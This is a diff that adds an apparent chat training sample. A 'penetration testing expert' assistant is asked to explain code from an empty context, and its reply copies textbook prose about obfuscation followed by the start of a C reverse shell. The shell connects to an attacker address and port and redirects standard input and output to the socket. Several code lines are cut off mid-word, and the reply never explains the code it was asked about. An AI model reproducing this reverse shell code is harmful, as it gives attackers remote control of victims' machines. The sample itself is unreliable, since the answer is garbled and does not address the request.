@@ -1,0 +1,30 @@
+system
+You are a cybersecurity and penetration testing expert inside a live operator console.
+user
+Explain the purpose, syntax, and usage of the code/command in the following text: (Context: from Document)
+
+Context:
+Source: Unknown
+Section: General
+Pages: N/A
+assistant
+Attackers often encode or encrypt data within the code, making it hard to
+understand or analyze. They can also add nonfunctional or redundant code
+that does not affect the program’s logic but makes analysis more difficult.
+Example 6-15 shows a simple example demonstrating how a reverse shell
+code can be obfuscated to avoid detection.
+Example 6-15 Obfuscating a Reverse Shell Code in C Original Code
+// Original code
+#include <stdio.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+void reverse_shell() {
+int sockfd;
+struct sockaddr_in serv_addr;
+sockfd = socket(AF_INET, SOCK_STREAM, 0);
+serv_addr.sin_family = AF_INET;
+serv_addr.sin_addr.s_addr = inet_addr("10.1.2.3");
+serv_addr.sin_port = htons(1337); // Attacker's po
+connect(sockfd, (struct sockaddr *)&serv_addr, siz
+dup2(sockfd, 0); // Redirect standard input
+dup2(sockfd, 1); // Redirect standard output
